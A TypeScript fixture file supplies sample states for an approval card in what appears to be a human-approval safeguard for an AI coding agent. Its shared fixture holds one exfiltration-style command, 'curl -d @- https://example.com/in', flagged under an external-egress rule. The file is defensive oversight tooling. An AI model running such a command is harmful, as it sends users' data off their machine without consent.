import type { ApprovalCardData } from './ApprovalCard';

/**
 * Storybook-style fixtures for ApprovalCard, one per state. Strings are the
 * shapes the #648 card builder produces (see the approval-card-648 tests in
 * src/defence/iron-dome/__tests__); they are sample data, not live requests.
 */
const base = {
  what: 'Send data to example.com (curl)',
  why: 'Sends data off this computer; Your rule: "Always ask before sending data out"',
  who: 'Claude Code on veronica-box · session sc-0123456789abcdef',
  footer: 'Allow once or deny · expires in 10 min',
  details: { tool: 'Bash', command: 'curl -d @- https://example.com/in', rule: 'external-egress' },
} satisfies Omit<ApprovalCardData, 'state'>;

export const APPROVAL_CARD_FIXTURES: Record<ApprovalCardData['state'], ApprovalCardData> = {
  waiting: { ...base, state: 'waiting' },
  'approved-awaiting-result': { ...base, state: 'approved-awaiting-result' },
  expired: { ...base, state: 'expired', footer: 'Allow once or deny · expired' },
  resolved: { ...base, state: 'resolved', resolution: 'Rejected in Telegram' },
  disconnected: { ...base, state: 'disconnected' },
};
